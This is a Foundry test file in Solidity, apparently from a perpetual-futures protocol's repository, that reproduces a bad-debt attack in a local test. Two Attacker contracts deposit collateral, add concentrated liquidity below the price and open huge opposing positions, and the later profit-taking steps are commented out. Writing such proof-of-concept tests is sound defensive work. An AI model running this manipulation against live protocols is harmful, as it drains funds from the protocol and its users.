// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";
import { UniswapV3Pool } from "@uniswap/v3-core/contracts/UniswapV3Pool.sol";

import "../helper/Setup.sol";
import "../../../contracts/ClearingHouse.sol";
import "../../../contracts/AccountBalance.sol";
import "../../../contracts/MarketRegistry.sol";
import "../../../contracts/Vault.sol";
import "../../../contracts/test/TestERC20.sol";

contract Attacker is Test {
    address public admin;
    ClearingHouse public clearingHouse;
    MarketRegistry public marketRegistry;
    AccountBalance public accountBalance;
    Vault public vault;
    TestERC20 public usdc;

    constructor(
        address adminArg,
        address clearingHouseArg,
        address marketRegistryArg,
        address payable vaultArg
    ) {
        admin = adminArg;
        clearingHouse = ClearingHouse(clearingHouseArg);
        marketRegistry = MarketRegistry(marketRegistryArg);
        accountBalance = AccountBalance(clearingHouse.getAccountBalance());
        vault = Vault(vaultArg);
        usdc = TestERC20(vault.getSettlementToken());
    }

    function deposit(uint256 amount) public {
        vm.deal(address(this), 10000 ether);

        vm.startPrank(admin);
        usdc.mint(address(this), amount);
        vm.stopPrank();

        TestERC20(usdc).approve(address(vault), amount);
        vault.deposit(address(usdc), amount);
    }

    function addLiquiditiy(address baseToken, uint256 quoteAmount) public returns (address pool) {
        pool = marketRegistry.getPool(baseToken);

        (, int24 tick, , , , , ) =
            // bool unlocked
            UniswapV3Pool(pool).slot0();
        int24 space = UniswapV3Pool(pool).tickSpacing();
        int24 closestTick = tick % space;

        // below the current price, only need quote
        IClearingHouse.AddLiquidityParams memory params =
            IClearingHouse.AddLiquidityParams({
                baseToken: baseToken,
                base: 1 ether,
                quote: quoteAmount,
                lowerTick: tick - closestTick - space - space,
                upperTick: tick - closestTick - space,
                minBase: 0,
                minQuote: 0,
                useTakerBalance: false,
                deadline: block.timestamp + 1
            });
        clearingHouse.addLiquidity(params);
    }

    function openShort(address baseToken, uint256 amount) public returns (uint256 baseAmount, uint256 quoteAmount) {
        IClearingHouse.OpenPositionParams memory params =
            IClearingHouse.OpenPositionParams({
                baseToken: baseToken,
                isBaseToQuote: true,
                isExactInput: false,
                amount: amount,
                oppositeAmountBound: 0,
                deadline: block.timestamp,
                sqrtPriceLimitX96: 0,
                referralCode: bytes32(0)
            });
        (baseAmount, quoteAmount) = clearingHouse.openPosition(params);
    }

    function openLong(address baseToken, uint256 amount) public returns (uint256 baseAmount, uint256 quoteAmount) {
        IClearingHouse.OpenPositionParams memory params =
            IClearingHouse.OpenPositionParams({
                baseToken: baseToken,
                isBaseToQuote: false,
                isExactInput: true,
                amount: amount,
                oppositeAmountBound: 0,
                deadline: block.timestamp,
                sqrtPriceLimitX96: 0,
                referralCode: bytes32(0)
            });
        (baseAmount, quoteAmount) = clearingHouse.openPosition(params);
    }
}

contract BadDebtAttackTest is Setup {
    uint256 public makerPrivateKey = uint256(2);
    address public maker = vm.addr(makerPrivateKey);
    uint8 public usdcDecimals;

    uint256 public initialUsdcAmount = 1_000_000e6;
    Attacker public badDebter;
    Attacker public exploiter;

    function setUp() public virtual override {
        Setup.setUp();

        vm.label(maker, "Maker");

        // initial market
        // TODO: use the real numbers of vONE on block 44985556
        pool.initialize(792281625142 ether);
        pool.increaseObservationCardinalityNext(250);
        marketRegistry.addPool(address(baseToken), pool.fee());
        marketRegistry.setFeeRatio(address(baseToken), 10000);
        marketRegistry.setInsuranceFundFeeRatio(address(baseToken), 100000);
        exchange.setMaxTickCrossedWithinBlock(address(baseToken), 250);

        // mock priceFeed
        vm.mockCall(
            _BASE_TOKEN_PRICE_FEED,
            abi.encodeWithSelector(IPriceFeed.getPrice.selector),
            abi.encode(100 * 1e8)
        );
        usdcDecimals = usdc.decimals();

        // mint usdc to maker and deposit to vault
        uint256 makerUsdcAmount = 10000 * 10**usdcDecimals;
        usdc.mint(maker, makerUsdcAmount);
        vm.startPrank(maker);
        usdc.approve(address(vault), makerUsdcAmount);
        vault.deposit(address(usdc), makerUsdcAmount);
        vm.stopPrank();

        // maker add liquidity
        vm.startPrank(maker);
        clearingHouse.addLiquidity(
            IClearingHouse.AddLiquidityParams({
                baseToken: address(baseToken),
                base: 200 ether,
                quote: 20000 ether,
                lowerTick: -887220,
                upperTick: 887220,
                minBase: 0,
                minQuote: 0,
                useTakerBalance: false,
                deadline: block.timestamp + 1000
            })
        );
        vm.stopPrank();

        // increase settlementTokenBalanceCap
        clearingHouseConfig.setSettlementTokenBalanceCap(10000000 * 10**usdcDecimals);

        badDebter = new Attacker(address(this), address(clearingHouse), address(marketRegistry), address(vault));
        exploiter = new Attacker(address(this), address(clearingHouse), address(marketRegistry), address(vault));
        vm.label(address(badDebter), "BadDebter");
        vm.label(address(exploiter), "Exploiter");
    }

    function testAttack() public {
        console.log("1. attacker deposits collaterals");
        badDebter.deposit(initialUsdcAmount);
        exploiter.deposit(initialUsdcAmount);

        console.log("2. exploiter add a huge concentrated liquidity (below the current price)");
        uint256 hugeAmount = 9 * initialUsdcAmount * 10**12;
        exploiter.addLiquiditiy(address(baseToken), hugeAmount);

        console.log("3. exploiter open a huge short position");
        exploiter.openShort(address(baseToken), hugeAmount);

        console.log("4. badDebter open a huge long position");
        badDebter.openLong(address(baseToken), hugeAmount);

        // console.log("5. exploiter remove the huge concentrated liquidity");
        // removeLiquidity(vOne, 0);

        // console.log("6. badDebter open a LP position at a really low price");
        // bad.unlimitLp(vOne, 200000 ether);

        // int256 bAVBefore7 = house.getAccountValue(address(bad));
        // console.log("7. badDebter close position and realize a huge loss");
        // bad.badSell(vOne, 0);
        // int256 bPSAfter7 = accountBalance.getTotalPositionSize(address(bad), vOne);
        // console.logInt(bPSAfter7);
        // int256 bAVAfter7 = house.getAccountValue(address(bad));
        // console.logInt(bAVBefore7);
        // console.logInt(bAVAfter7);

        // console.log("8. exploiter close position and take the profit");
        // sellMax(vOne, 0);
        // int256 bAVAfter8 = house.getAccountValue(address(bad));
        // console.logInt(bAVAfter8);

        // vault.withdrawAll(usdc);
        // uint256 currentUsdc = ERC20(usdc).balanceOf(address(this));
        // console.log("currentUsdc:", currentUsdc);
        // console.log("profit:", currentUsdc - initialUsdcAmount * 2);
    }
}
